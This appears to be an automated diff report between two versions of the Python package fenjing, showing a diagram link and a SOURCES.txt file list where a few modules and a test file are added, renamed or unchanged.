+[![](https://mermaid.ink/img/pako:eNp1VE1PxCAQ_SuERE_2D-zBg_GoF_WkNc0sHbZECisf7upm_7tQrNCPpUnDPB5vhpmBE2W6RbqhXOoD68A48nJXKxKG9dudgX1HvBPSkgTGwbTURvxgRgx-erQOTYa4Nn25RVmXzTRD1c49WTSVUEGIA8PSpRRvHOyGQxUWe6FARuw9Mw649ZGzjRwuDHJ9TOD7RIZU1W3C_4Mgsyhi6DZvuroibdBjTmhFnh4Kl8Ab7hVrdqia6Xmj1TAD7KPMiWWgGm_kOi9FVmheytIeXGcvhBHX8lK0lmGU6MJpoTB4Xvj-lhrawn3Ozdg4fwV3eHTNF5iCazuUsvnTmJC52C1x7jM7JyQdYQWcypDrqbvhpHPFASzt65XI_yswts-yuuPKtMIjuixD-g9teEFx1hlrwSfirJrrxPjRG9qHuwOiDdf9FDfX1HXYY003YarQOwOyprU6Byp4p5-_FaMbZzzeUL9vweG9gNAHPQ2XTNqA7kG9ap1tbIXT5jE9KcPLcv4FmdNlhw?type=png)](https://mermaid.live/edit#pako:eNp1VE1PxCAQ_SuERE_2D-zBg_GoF_WkNc0sHbZECisf7upm_7tQrNCPpUnDPB5vhpmBE2W6RbqhXOoD68A48nJXKxKG9dudgX1HvBPSkgTGwbTURvxgRgx-erQOTYa4Nn25RVmXzTRD1c49WTSVUEGIA8PSpRRvHOyGQxUWe6FARuw9Mw649ZGzjRwuDHJ9TOD7RIZU1W3C_4Mgsyhi6DZvuroibdBjTmhFnh4Kl8Ab7hVrdqia6Xmj1TAD7KPMiWWgGm_kOi9FVmheytIeXGcvhBHX8lK0lmGU6MJpoTB4Xvj-lhrawn3Ozdg4fwV3eHTNF5iCazuUsvnTmJC52C1x7jM7JyQdYQWcypDrqbvhpHPFASzt65XI_yswts-yuuPKtMIjuixD-g9teEFx1hlrwSfirJrrxPjRG9qHuwOiDdf9FDfX1HXYY003YarQOwOyprU6Byp4p5-_FaMbZzzeUL9vweG9gNAHPQ2XTNqA7kG9ap1tbIXT5jE9KcPLcv4FmdNlhw)
```

### Comparing `fenjing-0.4.6.1/fenjing.egg-info/SOURCES.txt` & `fenjing-0.4.7/fenjing.egg-info/SOURCES.txt`

 * *Files 16% similar despite different names*

```diff
@@ -7,24 +7,26 @@
 fenjing/__init__.py
 fenjing/__main__.py
 fenjing/cli.py
 fenjing/colorize.py
 fenjing/config_payload.py
 fenjing/const.py
 fenjing/context_vars.py
+fenjing/cracker.py
 fenjing/form.py
-fenjing/form_cracker.py
 fenjing/full_payload_gen.py
 fenjing/payload_gen.py
 fenjing/requester.py
 fenjing/scan_url.py
 fenjing/shell_payload.py
+fenjing/submitter.py
 fenjing/waf_func_gen.py
 fenjing/webui.py
 fenjing.egg-info/PKG-INFO
 fenjing.egg-info/SOURCES.txt
 fenjing.egg-info/dependency_links.txt
 fenjing.egg-info/requires.txt
 fenjing.egg-info/top_level.txt
 fenjing/templates/index.html
+tests/test_cracker.py
 tests/test_full_payload_gen.py
 tests/test_payload_gen.py
```

### Comparing `fenjing-0.4.6.1/setup.py` & `fenjing-0.4.7/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/tests/test_full_payload_gen.py` & `fenjing-0.4.7/tests/test_full_payload_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.6.1/tests/test_payload_gen.py` & `fenjing-0.4.7/tests/test_payload_gen.py`

 * *Files identical despite different names*

